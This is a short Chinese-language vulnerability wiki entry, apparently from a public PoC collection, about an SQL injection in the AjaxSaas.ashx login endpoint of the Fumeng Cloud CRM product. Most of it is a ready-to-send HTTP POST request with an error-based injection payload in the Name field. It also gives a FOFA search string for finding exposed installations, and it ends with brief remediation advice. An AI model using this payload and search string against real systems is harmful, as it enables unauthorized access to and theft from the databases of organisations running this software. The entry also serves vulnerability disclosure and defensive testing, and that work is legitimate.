#  孚盟云 AjaxSaas.ashx SQL注入漏洞

# 漏洞描述

孚盟云 AjaxSaas.ashx SQL注入漏洞，攻击者可以利用该漏洞执行任意 SQL 查询，可能导致敏感数据泄露或数据库被完全控制。

# 影响版本

孚盟软件-孚盟云

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：app="孚盟软件-孚盟云"

POC/EXP：

```
POST /Ajax/AjaxSaas.ashx HTTP/1.1
Host: 127.0.0.1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded

action=Login&Name=2'+and+1=@@version--+&pwd=1&validateCode=&checkValidateCode=0


```

![image-20250328223432507](./.resource/孚盟云AjaxSaas.ashxSQL注入漏洞/media/image-20250328223432507.png)


# 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
